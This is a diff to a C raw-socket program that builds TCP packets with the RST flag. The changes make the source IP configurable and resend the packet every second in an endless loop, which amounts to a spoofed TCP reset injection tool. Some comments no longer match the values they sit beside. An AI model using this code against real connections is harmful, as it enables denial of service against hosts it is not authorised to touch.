@@ -15,6 +15,7 @@ This code is a modified version of the code found at https://www.binarytides.com
 #include <netinet/tcp.h>
 #include <netinet/ip.h>
 #include <arpa/inet.h>
+#include <unistd.h>
 
 struct pseudo_header
 {
@@ -89,10 +90,10 @@ int main(int argc, char *argv[])
 
     // Data content
     data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
-    strcpy(data, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
+    strcpy(data, ""); // arbitrary data
 
     // Address resolution
-    strcpy(source_ip, "192.168.1.44");
+    strcpy(source_ip, source_adr);
     sin.sin_family = AF_INET;
     sin.sin_port = htons(port);
     sin.sin_addr.s_addr = inet_addr(dest_adr);
@@ -116,14 +117,14 @@ int main(int argc, char *argv[])
     //TCP header
     tcph->source = htons(port);
     tcph->dest = htons(port);
-    tcph->seq = 1; // seq number 1, as handshake has already been done
-    tcph->ack_seq = 1; // ack number also now 1
+    tcph->seq = 0; // seq number 1, as handshake has already been done
+    tcph->ack_seq = 0; // ack number also now 1
     tcph->doff = 5; // tcp header size
     tcph->fin = 0;
     tcph->syn = 0;
     tcph->rst = 1; // reset the connection
     tcph->psh = 0;
-    tcph->ack = 1;
+    tcph->ack = 0;
     tcph->urg = 0;
     tcph->window = htons(5840); // max allowed window size
     tcph->check = 0;
@@ -154,13 +155,18 @@ int main(int argc, char *argv[])
         exit(0);
     }
 
-    if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0)
+
+    while (1)
     {
-        perror("sento failed");
-    }
-    else
-    {
-        printf("Packet sent. Length: %d \n", iph->tot_len);
+        sleep(1);
+        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0)
+        {
+            perror("sento failed");
+        }
+        else
+        {
+            printf("Packet sent. Length: %d \n", iph->tot_len);
+        }
     }
 
     return 0;
